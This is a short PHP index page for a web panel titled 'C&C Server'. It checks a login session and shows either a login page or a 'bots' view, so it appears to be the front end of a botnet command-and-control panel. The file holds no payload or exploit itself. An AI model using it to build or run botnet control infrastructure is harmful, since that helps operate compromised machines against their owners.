<?php
	session_start(); // Init sessions

	// If the session doesn't exist we turn it to false
	if (!isset($_SESSION['logged']))
		$_SESSION['logged'] = "false";

	include('include/connection.php');
	include('include/settings.php');
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
		<title>C&amp;C Server</title>
		<script type="text/javascript" src="include/scripts.js"></script>
	</head>
	<body onload="noblur();">
		<?php
			if ($_SESSION['logged'] == "true") {
		   		if(isset($_GET['action'])){
		   			if ($_GET['action'] == "logoff")
						session_destroy();

					include('login.php');
				}
				else
					include('bots.php');
			}
			else
				include('login.php');
		?>
	</body>
</html>
